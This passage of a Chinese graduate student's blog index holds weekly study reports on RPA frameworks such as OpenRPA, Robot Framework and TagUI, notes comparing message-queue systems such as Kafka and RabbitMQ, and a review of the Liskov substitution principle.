id="容器化"><a href="#容器化" class="headerlink" title="容器化"></a>容器化</h4><h4 id="RPA开发运维"><a href="#RPA开发运维" class="headerlink" title="RPA开发运维"></a>RPA开发运维</h4><p>从软件供应商转变为服务供应商<br>在共享服务中，自动化会变得极其慢，集群</p><h3 id="后期安排"><a href="#后期安排" class="headerlink" title="后期安排"></a>后期安排</h3><p>UiPath、tensorFlow</p>]]></content>
      
      
      <categories>
          
          <category> RPA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> RPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-03-26【周总结】</title>
      <link href="/2021/03/24/2021-03-24%E3%80%90Week%E3%80%91/"/>
      <url>/2021/03/24/2021-03-24%E3%80%90Week%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h2 id="本周安排"><a href="#本周安排" class="headerlink" title="本周安排"></a>本周安排</h2><ul><li><input disabled="" type="checkbox"> MIT6.004课程完成</li><li><input checked="" disabled="" type="checkbox"> 学位英语</li><li><input disabled="" type="checkbox"> 继续查询项目依赖bug</li><li><input checked="" disabled="" type="checkbox"> 查询论文，并阅读总结两篇</li><li><input checked="" disabled="" type="checkbox"> openRPA实例实现</li></ul><h2 id="完成情况"><a href="#完成情况" class="headerlink" title="完成情况"></a>完成情况</h2><blockquote><p>主要精力放在学位英语上了，后期学习了部分MIT6003的课程，以及最后研究了openRPA的使用</p></blockquote><p><strong>论文方面</strong></p><pre><code>    与openRPA技术相关的论文还是没有查阅到，只是查阅了一些综述以及国内外对于RPA预测的推文，现在归纳了三个可研究点：</code></pre><ol><li>RPA机器人在运行时一般需要最高权限，这就可能引起黑客的攻击直接让过传统权限控制系统，通过直接攻击黑客来攻击系统</li><li>找到一个适合的场景，做RPA+AI，类似文本、语音、或者直接获取通讯记录来给RPA传输指令，这个研究点是目前比较常被提到的RPA4.0</li><li>RPA缺乏对于未知问题的解决能力，这个点预计很难研究，这是一个普遍问题</li></ol><p><strong>个人课程学习</strong></p><blockquote><p>空间技术课程提到一个“社会计算”，这个是杨老师他们大实验的学长有过研究就是给我们科普了一下，不过李波老师提到了他们大实验室有个好的idea就是搭建一个实验室的微服务系统，然后把每届的研究成果数据都放上去，以方便给后几届学弟学妹使用，老师我觉得我们实验室与师兄师姐交流太少了，而且他们也很忙几乎没有空和我们交流，这个idea也可以实现在我们实验室，对于学生提供了一个很好的学习见解。</p></blockquote><p><strong>公司方面</strong></p><blockquote><p>每周没有任务跟进，后期会对公司依赖bug进行查询补充</p></blockquote><h2 id="下周安排"><a href="#下周安排" class="headerlink" title="下周安排"></a>下周安排</h2><ul><li><input disabled="" type="checkbox"> 根据已经发现的RPA研究点中的第一个小点进行查阅论文并总结</li><li><input disabled="" type="checkbox"> 今天对openRPA进行了初步阅读，发现openRPA是C#的项目，本身没有学习过，会花两到三天进行学习C#语言，然后阅读源码</li><li><input disabled="" type="checkbox"> 继续学习MIT6003课程</li><li><input disabled="" type="checkbox"> 补充公司项目依赖部分bug</li><li><input disabled="" type="checkbox"> 每天尽量听会英语课程</li></ul>]]></content>
      
      
      <categories>
          
          <category> weekly report </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> report </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-3-19【周总结】</title>
      <link href="/2021/03/19/2021-3-19%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/"/>
      <url>/2021/03/19/2021-3-19%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h2 id="本周安排"><a href="#本周安排" class="headerlink" title="本周安排"></a>本周安排</h2><ul><li><input checked="" disabled="" type="checkbox"> 熟悉OpenRPA框架</li><li><input checked="" disabled="" type="checkbox"> 通过代码实操学习对数据库的操作</li><li><input checked="" disabled="" type="checkbox"> 阅读相关论文–流程机器人+AI</li><li><input checked="" disabled="" type="checkbox"> 做网络安全课程PPT</li><li><input checked="" disabled="" type="checkbox"> 英语学习</li><li><input disabled="" type="checkbox"> 对比五个框架，并总结</li></ul><h2 id="后加入的任务"><a href="#后加入的任务" class="headerlink" title="后加入的任务"></a>后加入的任务</h2><ol><li>帮助公司接口优化整理项目依赖资料</li><li>完成部分公司项目依赖版本与最新版之间错误的总结</li></ol><h2 id="完成情况"><a href="#完成情况" class="headerlink" title="完成情况"></a>完成情况</h2><blockquote><p>本周主要主要精力集中于论文、学习实操了一些mabtis代码后面有花费了不到两天整合公司项目依赖相关材料,五个框架没有整理太多。</p></blockquote><p><strong>论文方面：</strong></p><pre><code>观看了为了“提出轻量级IT程序与自动化流程集成的规范化”的论文和The Forrester Wave™2018年发表的RPA总结汇报。</code></pre><p>1、第一篇中详细阐明RPA中的轻量IT的使用场景，规则以及与传统系统的区别，更加容易明白轻量IT在自动化流程中的作用，加深了对于RPA的理解—–只要有载体可以实现所有人的行为【可能一开始从五个框架入手，被局限于自动化测试了】<br>2、第二篇从报告中了解较为认可的15个成熟的框架，以及这个报告详细阐述了RPA评定的规则</p><p><strong>个人课程学习</strong></p><ul><li>加深了在小论文方面的学习</li><li>对于小论文的发表有了基本的概念，现在加强论文方面阅读，寻找该方向研究点</li></ul><p> <strong>公司方面</strong></p><ul><li>主要参与负责总结公司项目依赖版本以及总结公司当前版本的无法修补的bug情况。前期基本完成，后期由于工作量比较大，完成了部分，我问了实验室其它人，他们说好像优化完成了，涛总也没问过我了，后期的bug调研就没有跟进了</li></ul><h2 id="下周安排"><a href="#下周安排" class="headerlink" title="下周安排"></a>下周安排</h2><ol><li>先将2018的年度关于RPA总结报告看完，理解RPA的评定规范</li><li>详细阅读OpenRPA源码，总结优缺点</li><li>查询与RPA相关的AI算法，扩展学习</li><li>将英语学习提上日常，每天背后单词，练下口语</li><li>不能放下代码能力，依旧进行少量代码实操</li></ol>]]></content>
      
      
      <categories>
          
          <category> weekly report </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> report </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>五个RPA框架通读</title>
      <link href="/2021/02/22/%E4%BA%94%E4%B8%AARPA%E6%A1%86%E6%9E%B6%E9%80%9A%E8%AF%BB/"/>
      <url>/2021/02/22/%E4%BA%94%E4%B8%AARPA%E6%A1%86%E6%9E%B6%E9%80%9A%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="Robot-Framework"><a href="#Robot-Framework" class="headerlink" title="Robot Framework"></a>Robot Framework</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><ul><li>接受测试驱动开发（ATDD），行为驱动开发（BDD）和机器人流程自动化（RPA）</li><li><a href="https://robotframework.org/#examples">社区</a></li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><blockquote><p>Robot Framework的环境搭建</p></blockquote><ol><li>安装wxpython需要安装wheel，不然无法打包安装======</li><li>需要安装与chrome版本匹配的driver到目录中</li></ol><h3 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h3><ol><li>通过代码来进行生产</li></ol><ul><li>项目组成</li></ul><p><img src="http://files.shanqianche.cn/202136/1615015210514.png" alt="项目组成"></p><blockquote><p>项目见压缩文件—项目一，下面是robot的代码结构组成</p></blockquote><p><a href="https://github.com/robotframework/QuickStartGuide/blob/master/QuickStart.rst#executing-this-guide">参考文档</a></p><p>robot核心结构是由三部分组成的，一个是keywords的依赖，第二个是关键字，最后则是执行动作</p><p><img src="http://files.shanqianche.cn/202136/1615015362634.png" alt="robot结构"></p><p><img src="http://files.shanqianche.cn/202136/1615015469911.png" alt="关键字组成"></p><p><img src="http://files.shanqianche.cn/202136/1615015588995.png" alt="动作"></p><p>运行效果，打包视频-robot1【视频总一个robot执行了两动作，所以结果都是两个】</p><p><img src="./videos/robot1.mkv" alt="robot1"></p><ol start="2"><li>通过较为成熟的工具–robocorp Lab</li></ol><p>==此工具可以实现的，robot framework都可以实验 #009688==</p><ul><li>结构组成</li></ul><p><img src="http://files.shanqianche.cn/202136/1615016378239.png" alt="项目结构"></p><p><img src="http://files.shanqianche.cn/202136/1615016399861.png" alt="robot结构"></p><ul><li>较为简单的栗子，自动打开浏览器然后访问url</li></ul><p><img src="./videos/robocorp1.mkv" alt="robocorp1"></p><ul><li>另一个栗子，登录功能的测试</li></ul><p><img src="./videos/robocorp2.mkv" alt="robocorp2"></p><blockquote><p>总结：和邹瑞进行过交流确实这个框架确实可以提升测试效率，由于执行动作可以通过传参来改变动作执行对象，所以可重复度明显提升，目前没有感觉到人工智能的应用点，下步继续了解。</p></blockquote><h2 id="TagUI"><a href="#TagUI" class="headerlink" title="TagUI"></a>TagUI</h2><h3 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h3><pre><code>    就是传统的，较为灵活但是复用性低；这个框架可以控制鼠标模拟动作    </code></pre><p><img src="http://files.shanqianche.cn/202136/1615018851173.png" alt="代码结构"></p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><ol><li><p>访问网站并截图</p><p> <img src="http://files.shanqianche.cn/202136/1615019129522.png" alt="源码"></p></li></ol><p><img src="./videos/tagui_1.mkv" alt="tagui_1"></p><p>==tagui在模拟人的行为上确实比robot framework #00BCD4==</p><ol start="2"><li>访问github上项目并下载等待完成</li></ol><p><img src="./videos/tagui_2.mkv" alt="tagui_2"></p><ol start="3"><li>可以通过表格来设置参数，高重复性</li></ol><p>  <img src="./videos/tagui_3.mkv" alt="tagui_3"></p><pre><code>      还有一些官方也提到可以获取数控中数据来进行测试，也可以通过中文命令来测试等</code></pre><h2 id="UI-Vision"><a href="#UI-Vision" class="headerlink" title="UI.Vision"></a>UI.Vision</h2><blockquote><p>有两个，一个是浏览器插件，另一个是桌面版。桌面版适用于手机上app的测试【没有进行实验】</p></blockquote><p><img src="./videos/2021-03-06_17-29-08.mkv" alt="2021-03-06 17-29-08"></p><p>总结：很傻瓜式，所有动作需要一模一样，否则无法找到指定的属性来换参，前面有一点不一样，后面将可能无法执行。</p><h2 id="open-RPA"><a href="#open-RPA" class="headerlink" title="open RPA"></a>open RPA</h2><p><a href="https://open-rpa.readthedocs.io/en/latest/">https://open-rpa.readthedocs.io/en/latest/</a></p><p><a href="https://docs.openiap.io/">https://docs.openiap.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> RPA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> RPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式开发---消息机制</title>
      <link href="/2021/02/01/%E5%88%86%E5%B8%83%E5%BC%8F%E5%BC%80%E5%8F%91---%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6/"/>
      <url>/2021/02/01/%E5%88%86%E5%B8%83%E5%BC%8F%E5%BC%80%E5%8F%91---%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="学习安排"><a href="#学习安排" class="headerlink" title="学习安排"></a>学习安排</h2><ol><li>理解目前微服务中消息机制的工作原理</li><li>了解消息服务生产时的机制</li><li>总结当前较为成熟的框架，即当前使用的使用程度</li><li>对比当前几大消息机制框架</li></ol><h2 id="学习关键内容记录"><a href="#学习关键内容记录" class="headerlink" title="学习关键内容记录"></a>学习关键内容记录</h2><h3 id="理解目前微服务中消息机制的工作原理"><a href="#理解目前微服务中消息机制的工作原理" class="headerlink" title="理解目前微服务中消息机制的工作原理"></a>理解目前微服务中消息机制的工作原理</h3><h4 id="基本架构的理解"><a href="#基本架构的理解" class="headerlink" title="基本架构的理解"></a>基本架构的理解</h4><p><a href="https://segmentfault.com/a/1190000019411260">source</a></p><blockquote><p>消息机制主要分为同步架构和异步架构</p></blockquote><ol><li><p>同步架构</p><p><strong>是指从请求的发起一直到最终的处理完成期间，请求的调用方一直在同步阻塞等待调用的处理完成。期间消息服务处于阻塞状态，只能等待当前事务处理完成。</strong></p><p><img src="http://files.shanqianche.cn/2021228/1614450258790.png" alt="同步调用"></p><pre><code>如图没产生一个消息都会通过中间服务一次传递然后等待消费者接收，并最后返回处理响应。</code></pre></li><li><p>异步架构</p><p><strong>指在请求发起的处理过程中，客户端的代码已经返回了，它可以继续进行自己的后续操作，而不需要等待调用处理完成，这就叫做异步调用。</strong></p><p><img src="http://files.shanqianche.cn/2021228/1614450508273.png" alt="异步调用"></p><pre><code>异步框架中，消息生产者无需等待消息处理结果返回，只需将消息传输到指定队列中即可，期间也不会发生阻塞。在这个过程中，客户端的调用，也就是应用程序的调用，和业务逻辑真正发送邮件的操作是不同步的。</code></pre></li></ol><blockquote><p>主要组成部分：消息生产者、消息消费者、分布式消息队列</p></blockquote><p><img src="http://files.shanqianche.cn/2021228/1614450706484.png" alt="异步调用框架组成"></p><p><font color="#A47D13">注意：</font></p><ul><li>消息队列实现的方法有好多种，可以用共享文件夹，也可以用关系数据库或者NoSQL系统，当然最主要的还是使用专门的分布式消息队列服务器来实现。</li><li>消息的消费者不需要知道生产者存在，它只依赖消息队列中的消息。</li></ul><blockquote><p>主要模型：点对点模型和发布订阅模型。</p></blockquote><ul><li>点对点模型：主要用于一些耗时较长的、逻辑相对独立的业务。</li><li>发布订阅模型：根据使用场景给用户提供主题订阅，提供特点业务。</li></ul><h4 id="消息队列的好处"><a href="#消息队列的好处" class="headerlink" title="消息队列的好处"></a>消息队列的好处</h4><ol><li>实现异步处理，提升处理性能</li><li>可以让系统获得更好的伸缩性</li></ol><p><img src="http://files.shanqianche.cn/2021228/1614451922193.png" alt="伸缩性"></p><pre><code>可以通过增加队列来提高负载    </code></pre><ol start="3"><li>可以平衡流量峰值，削峰填谷</li></ol><p><img src="http://files.shanqianche.cn/2021228/1614451962482.png" alt="削峰填谷"></p><pre><code>使用消息队列，即便是访问流量持续的增长，系统依然可以持续地接收请求。</code></pre><ol start="4"><li><p>失败隔离和自我修复</p><pre><code> 因为发布者不直接依赖消费者，所以分布式消息队列可以将消费者系统产生的错误异常与生产者系统隔离开来，生产者不受消费者失败的影响。 当在消息消费过程中出现处理逻辑失败的时候，这个错误只会影响到消费者自身，而不会传递给消息的生产者，也就是应用程序可以按照原来的处理逻辑继续执行。 所以，这也就意味着在任何时候都可以对后端的服务器执行维护和发布操作。可以重启、添加或删除服务器，而不影响生产者的可用性，这样简化了部署和服务器管理的难度。</code></pre></li><li><p>可以使生产者和消费者的代码实现解耦合</p></li></ol><p><img src="http://files.shanqianche.cn/2021228/1614452072670.png" alt="解耦"></p><h3 id="消息服务详细运行机制"><a href="#消息服务详细运行机制" class="headerlink" title="消息服务详细运行机制"></a>消息服务详细运行机制</h3><pre><code>    消息服务主要用于异步处理，应用解耦，流量削锋和消息通讯四个场景。</code></pre><blockquote><p>异步处理</p></blockquote><p><font color="#011E47">应对场景：</font>避免因网络问题或者用户主观问题，消息未能及时得到处理而丢失的问题</p><p><strong>传统两种做法</strong></p><p><img src="http://files.shanqianche.cn/2021228/1614485333157.png" alt="串行方式"></p><p><img src="http://files.shanqianche.cn/2021228/1614485380154.png" alt="并行方式"></p><p><em>与串行的差别是，并行的方式可以提高处理的时间。</em></p><blockquote><p>应用解耦</p></blockquote><p><font color="#011E47">应对场景：</font></p><ul><li>传统模式下，消息的分发都集成在服务端，一旦系统错误，消息都将配发失败</li><li>与服务端耦合</li></ul><blockquote><p>流量削峰</p></blockquote><p><img src="http://files.shanqianche.cn/2021228/1614492372088.png" alt="削峰"></p><pre><code>秒杀活动，一般会因为流量过大，导致流量暴增，应用挂掉。为解决这个问题，一般需要在应用前端加入消息队列。</code></pre><blockquote><p>日志处理</p></blockquote><pre><code>指将消息队列用在日志处理中，比如Kafka的应用，解决大量日志传输的问题。</code></pre><p><img src="http://files.shanqianche.cn/2021228/1614492539873.png" alt="新浪kafka日志处理"></p><ol><li>Kafka：接收用户日志的消息队列。</li><li>Logstash：做日志解析，统一成JSON输出给Elasticsearch。</li><li>Elasticsearch：实时日志分析服务的核心技术，一个schemaless，实时的数据存储服务，通过index组织数据，兼具强大的搜索和统计功能。</li><li>Kibana：基于Elasticsearch的数据可视化组件，超强的数据可视化能力是众多公司选择ELK stack的重要原因。</li></ol><blockquote><p>消息通讯</p></blockquote><pre><code>☞消息队列一般都内置了高效的通信机制，因此也可以用在纯的消息通讯。</code></pre><ul><li>点对点通讯</li></ul><p><img src="http://files.shanqianche.cn/2021228/1614492613488.png" alt="点对点通讯"></p><ul><li>聊天室通讯</li></ul><p><img src="http://files.shanqianche.cn/2021228/1614492657622.png" alt="聊天室通讯"></p><h3 id="主要框架"><a href="#主要框架" class="headerlink" title="主要框架"></a>主要框架</h3><p><a href="https://segmentfault.com/a/1190000019411260">source</a></p><blockquote><p>RabbitMQ 、ActiveMQ、RocketMQ 、Kafka</p></blockquote><ol><li>RabbitMQ 的主要特点是性能好，社区活跃，但是RabbitMQ用Erlang开发，我们的应用很少用Erlang，所以不便于二次开发和维护。</li><li>ActiveMQ 影响比较广泛，可以跨平台，使用Java开发，对Java比较友好。</li><li>RocketMQ 是阿里推出的一个开源产品，也是使用Java开发，性能比较好，可靠性也比较高。</li><li>Kafka 是LinkedIn出品的，专门针对分布式场景进行了优化，因此分布式的伸缩性会比较好。</li></ol><blockquote><p>目前看来，Kafka因为最初设计时就是针对互联网的分布式、高可用应用场景而设计，并且在大数据领域得到广泛支持，资料文档更加完善，因此在互联网企业得到更多的应用。</p></blockquote><h3 id="五个主流框架"><a href="#五个主流框架" class="headerlink" title="五个主流框架"></a>五个主流框架</h3><p><a href="https://cloud.tencent.com/developer/article/1449951">多维度对比5款主流分布式MQ消息队列</a></p><ol><li><p>Kafka</p><pre><code> Kafka作为时下最流行的开源消息系统，被广泛地应用在数据缓冲、异步通信、汇集日志、系统解耦等方面。相比较于RocketMQ等其他常见消息系统，Kafka在保障了大部分功能特性的同时，还提供了超一流的读写性能。 Kafka是一种分布式的，基于发布/订阅的消息系统。主要设计目标如下： 以时间复杂度为O(1)的方式提供消息持久化能力，即使对TB级以上数据也能保证常数时间复杂度的访问性能。 高吞吐率。即使在非常廉价的商用机器上也能做到单机支持每秒100K条以上消息的传输。 支持Kafka Server间的消息分区，及分布式消费，同时保证每个Partition内的消息顺序传输。 同时支持离线数据处理和实时数据处理。 Scale out：支持在线水平扩展。 很明显的看出Kafka的性能远超RabbitMQ。不过这也是理所当然的，毕竟2个消息队列实现的协议是不一样的，处理消息的场景也大有不同。 *RabbitMQ适合处理一些数据严谨的消息，比如说支付消息，社交消息等不能丢失的数据。Kafka是批量操作切不报证数据是否能完整的到达消费者端，所以适合一些大量的营销消息的场景。*</code></pre></li><li><p>RabbitMQ</p><pre><code> RabbitMQ是使用Erlang编写的一个开源的消息队列，本身支持很多的协议：AMQP，XMPP, SMTP, STOMP，也正因如此，它非常重量级，更适合于企业级的开发。同时实现了Broker构架，这意味着消息在发送给客户端时先在中心队列排队。对路由，负载均衡或者数据持久化都有很好的支持。 它支持开放的高级消息队列协议 (AMQP，Advanced Message Queuing Protocol)，从根本上避免了生产厂商的封闭，使用任何语言的各种客户都可以从中受益。这种协议提供了相当复杂的消息传输模式，所以基本上不需要MassTransit或NServiceBus的配合。它还具有“企业级”的适应性和稳定性。这些东西对我的客户来说十分的有吸引力。 </code></pre></li><li><p>ZeroMQ</p><pre><code> ZeroMQ号称最快的消息队列系统，尤其针对大吞吐量的需求场景。跟其它几个接受测试的产品不同，你不需要安装和运行一个消息服务器，或中间件。你只需要简单的引用ZeroMQ程序库，可以使用NuGet安装，然后你就可以愉快的在应用程序之间发送消息了。非常有趣的是，他们也同样使用这方式在任何利用ZeroMQ进行强大的进程内通信的语言里创建Erlang风格的这种执行角色。ZeroMQ和其它的不是一个级别。它的性能惊人的高。公平的说，ZeroMQ跟其它几个比起来像头巨兽，尽管这样，结论很清楚：如果你希望一个应用程序发送消息越快越好，你选择ZeroMQ。当你不太在意偶然会丢失某些消息的情况下更有价值。其中，Twitter的Storm中使用ZeroMQ作为数据流的传输。 </code></pre></li><li><p>ActiceMQ</p><pre><code> Java世界的中坚力量。基于JMS协议。它有很长的历史，而且被广泛的使用。它还是跨平台的，给那些非微软平台的产品提供了一个天然的集成接入点。然而，它只有跑过了MSMQ才有可能被考虑。 ActiveMQ是Apache下的一个子项目。 类似于ZeroMQ，它能够以代理人和点对点的技术实现队列。同时类似于RabbitMQ，它少量代码就可以高效地实现高级应用场景。 </code></pre></li><li><p>Jafka</p><pre><code> Jafka是在Kafka之上孵化而来的，即Kafka的一个升级版。具有以下特性：快速持久化，可以在O(1)的系统开销下进行消息持久化；高吞吐，在一台普通的服务器上既可以达到10W/s的吞吐速率；完全的分布式系统，Broker、Producer、Consumer都原生自动支持分布式，自动实现负载均衡；支持Hadoop数据并行加载，对于像Hadoop的一样的日志数据和离线分析系统，但又要求实时处理的限制，这是一个可行的解决方案。</code></pre></li></ol><h2 id="扩展学习"><a href="#扩展学习" class="headerlink" title="扩展学习"></a>扩展学习</h2><h3 id="JMS消息服务"><a href="#JMS消息服务" class="headerlink" title="JMS消息服务"></a>JMS消息服务</h3><h4 id="消息模型"><a href="#消息模型" class="headerlink" title="消息模型"></a>消息模型</h4><h4 id="JMS编程模型"><a href="#JMS编程模型" class="headerlink" title="JMS编程模型"></a>JMS编程模型</h4><pre><code>JMS（JAVA Message Service,java消息服务）API是一个消息服务的标准/规范，允许应用程序组件基于JavaEE平台创建、发送、接收和读取消息。它使分布式通信耦合度更低，消息服务更加可靠以及异步性。同样也是两种基本通信模式：点对点（Point-to-Point Messaging Domain），发布/订阅模式（Publish/Subscribe Messaging Domain）。</code></pre><blockquote><p>P2P模式</p></blockquote><p><img src="http://files.shanqianche.cn/2021228/1614493377889.png" alt="P2P"></p><pre><code>P2P模式包含三个角色：消息队列（Queue），发送者(Sender)，接收者(Receiver)。每个消息都被发送到一个特定的队列，接收者从队列中获取消息。队列保留着消息，直到他们被消费或超时。</code></pre><p><strong>特点：</strong></p><ul><li>每个消息只有一个消费者（Consumer）(即一旦被消费，消息就不再在消息队列中)</li><li>发送者和接收者之间在时间上没有依赖性，也就是说当发送者发送了消息之后，不管接收者有没有正在运行，它不会影响到消息被发送到队列</li><li>接收者在成功接收消息之后需向队列应答成功</li></ul><blockquote><p>发布/订阅模式</p></blockquote><p><img src="http://files.shanqianche.cn/2021228/1614493982534.png" alt="Pub/sub模式"></p><pre><code>包含三个角色主题（Topic），发布者（Publisher），订阅者（Subscriber） 。多个发布者将消息发送到Topic,系统将这些消息传递给多个订阅者。</code></pre><p><strong>特点：</strong></p><ul><li>每个消息可以有多个消费者；</li><li>发布者和订阅者之间有时间上的依赖性。针对某个主题（Topic）的订阅者，它必须创建一个订阅者之后，才能消费发布者的消息；</li><li>为了消费消息，订阅者必须保持运行的状态。（为了缓和这样严格的时间相关性，JMS允许订阅者创建一个可持久化的订阅，即使订阅者没有被激活（运行），它也能接收到发布者的消息。）</li></ul><p><font color=""></font></p><p><img src="http://files.shanqianche.cn/2021228/1614494208056.png" alt="JMS模型"></p><p><strong>组成</strong></p><ol><li>管理对象（Administered objects）-连接工厂（Connection Factories）和目的地（Destination）</li><li>连接对象（Connections）</li><li>会话（Sessions）</li><li>消息生产者（Message Producers）</li><li>消息消费者（Message Consumers）</li><li>消息监听者（Message Listeners）</li></ol><ul><li><p>ConnectionFactory<br>创建Connection对象的工厂，针对两种不同的jms消息模型，分别有QueueConnectionFactory和TopicConnectionFactory两种。可以通过JNDI来查找ConnectionFactory对象。</p></li><li><p>Destination<br>Destination的意思是消息生产者的消息发送目标或者说消息消费者的消息来源。对于消息生产者来说，它的Destination是某个队列（Queue）或某个主题（Topic）;对于消息消费者来说，它的Destination也是某个队列或主题（即消息来源）。<br>所以，Destination实际上就是两种类型的对象：Queue、Topic可以通过JNDI来查找Destination。</p></li><li><p>Connection<br>Connection表示在客户端和JMS系统之间建立的链接（对TCP/IP socket的包装）。Connection可以产生一个或多个Session。跟ConnectionFactory一样，Connection也有两种类型：QueueConnection和TopicConnection。</p></li><li><p>Session<br>Session是操作消息的接口。可以通过session创建生产者、消费者、消息等。Session提供了事务的功能。当需要使用session发送/接收多个消息时，可以将这些发送/接收动作放到一个事务中。同样，也分QueueSession和TopicSession。</p></li><li><p>消息的生产者<br>消息生产者由Session创建，并用于将消息发送到Destination。同样，消息生产者分两种类型：QueueSender和TopicPublisher。可以调用消息生产者的方法（send或publish方法）发送消息。</p></li><li><p>消息消费者<br>消息消费者由Session创建，用于接收被发送到Destination的消息。两种类型：QueueReceiver和TopicSubscriber。可分别通过session的createReceiver(Queue)或createSubscriber(Topic)来创建。当然，也可以session的creatDurableSubscriber方法来创建持久化的订阅者。</p></li><li><p>MessageListener<br>消息监听器。如果注册了消息监听器，一旦消息到达，将自动调用监听器的onMessage方法。EJB中的MDB（Message-Driven Bean）就是一种MessageListener。</p><h3 id="MSMQ"><a href="#MSMQ" class="headerlink" title="MSMQ"></a>MSMQ</h3><p>  MSMQ是微软的产品里唯一被认为有价值的东西。对客户来说，如果MSMQ能证明可以应对这种任务，他们将选择使用它。关键是这个东西并不复杂，除了接收和发送，没有别的；它有一些硬性限制，比如最大消息体积是4MB。然而，通过和一些像MassTransit或NServiceBus这样的软件的连接，它完全可以解决这些问题。</p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>  Redis是一个Key-Value的NoSQL数据库，开发维护很活跃，虽然它是一个Key-Value数据库存储系统，但它本身支持MQ功能，所以完全可以当做一个<strong>轻量级的队列服务</strong>来使用。对于RabbitMQ和Redis的入队和出队操作，各执行100万次，每10万次记录一次执行时间。测试数据分为128Bytes、512Bytes、1K和10K四个不同大小的数据。实验表明：入队时，当数据比较小时Redis的性能要高于RabbitMQ，而如果数据大小超过了10K，Redis则慢的无法忍受；出队时，无论数据大小，Redis都表现出非常好的性能，而RabbitMQ的出队性能则远低于Redis。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> weekly report </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> report </tag>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式复习-2</title>
      <link href="/2021/01/03/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%A4%8D%E4%B9%A0-2/"/>
      <url>/2021/01/03/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%A4%8D%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="里氏替换原则（Liskov-Substitution-Principle，LSP）"><a href="#里氏替换原则（Liskov-Substitution-Principle，LSP）" class="headerlink" title="里氏替换原则（Liskov Substitution Principle，LSP）"></a>里氏替换原则（Liskov Substitution Principle，LSP）</h1><h2 id="爱恨纠葛的父子关系—继承"><a href="#爱恨纠葛的父子关系—继承" class="headerlink" title="爱恨纠葛的父子关系—继承"></a>爱恨纠葛的父子关系—继承</h2><p><strong>优点：</strong></p><ol><li>代码共享，减少创建类的工作量，每个子类都拥有父类的方法和属性；</li><li>提高代码的重用性；</li><li>子类可以形似父类，但又异于父类，“龙生龙，凤生凤，老鼠生来会打洞”是说子拥有父的“种”，“世界上没有两片完全相同的叶子”是指明子与父的不同；</li><li>提高代码的可扩展性，实现父类的方法就可以“为所欲为”了，君不见很多开源框架的扩展接口都是通过继承父类来完成的；</li><li>提高产品或项目的开放性</li></ol><p> <strong>缺点：</strong></p><ol><li> 继承是侵入性的。只要继承，就必须拥有父类的所有属性和方法；</li><li> 降低代码的灵活性。子类必须拥有父类的属性和方法，让子类自由的世界中多了些约束；</li><li> 增强了耦合性。当父类的常量、变量和方法被修改时，需要考虑子类的修改，而且在缺乏规范的环境下，这种修改可能带来非常糟糕的结果——大段的代码需要重构。</li></ol><blockquote><p>“利”大于弊，发挥利的最大作用。</p></blockquote><p><strong>What‘s mwan LSP?</strong><br>最正宗的定义：If for each object o1 of type S there is an object o2 of type T such that for all programs P defined in terms of T,the behavior of P is unchanged when o1 is substituted for o2 then S is a subtype of T.（如果对每一个类型为S的对象o1，都有类型为T的对象o2，使得以T定义的所有程序P在所有的对象o1都代换成o2时，程序P的行为没有发生变化，那么类型S是类型T的子类型。）<br>最清晰明确的：Functions that use pointers or references to base classes must be able to use objects of derived classes without knowing it.（所有引用基类的地方必须能透明地使用其子类的对象。）通俗点讲，<font color="#86AECE">只要父类能出现的地方子类就可以出现，而且替换为子类也不会产生任何错误或异常，使用者可能根本就不需要知道是父类还是子类。但是，反过来就不行了，有子类出现的地方，父类未必就能适应。</font></p>]]></content>
      
      
      <categories>
          
          <category> exam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
            <tag> exam </tag>
            
            <tag> design-model </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高级软件考试准备---研究生</title>
      <link href="/2021/01/03/%E9%AB%98%E7%BA%A7%E8%BD%AF%E4%BB%B6%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87---%E7%A0%94%E7%A9%B6%E7%94%9F/"/>
      <url>/2021/01/03/%E9%AB%98%E7%BA%A7%E8%BD%AF%E4%BB%B6%E8%80%83%E8%AF%95%E5%87%86%E5%A4%87---%E7%A0%94%E7%A9%B6%E7%94%9F/</url>
      
